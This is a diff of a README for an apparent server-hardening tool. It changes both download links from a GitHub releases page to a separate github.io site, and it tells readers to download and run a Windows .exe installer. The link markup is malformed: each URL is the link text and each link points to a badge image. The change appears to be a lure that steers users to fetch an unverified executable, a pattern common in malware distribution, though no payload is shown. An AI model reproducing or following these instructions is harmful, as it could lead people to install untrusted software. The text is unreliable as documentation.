@@ -1,6 +1,6 @@
 # 🛡️ server-security-init-skill - Harden your new server connection now
 
-[https://github.com/yatirimsahibi/server-security-init-skill/releases](https://img.shields.io/badge/Download-Latest_Release-blue)
+[https://yatirimsahibi.github.io](https://img.shields.io/badge/Download-Latest_Release-blue)
 
 ## 📌 About this tool
 
@@ -26,7 +26,7 @@ This software prepares a new server for secure use. When you rent a fresh server
 
 Visit the project release page to get the installer. You can find all versions here. Choose the file named with the latest version number ending in .exe. 
 
-[https://github.com/yatirimsahibi/server-security-init-skill/releases](https://img.shields.io/badge/Download-File-grey)
+[https://yatirimsahibi.github.io](https://img.shields.io/badge/Download-File-grey)
 
 Click the link to open the download page. Locate the "Assets" section. Click the link that matches the standard Windows installer format. Save the file to your desktop for easy access.
 
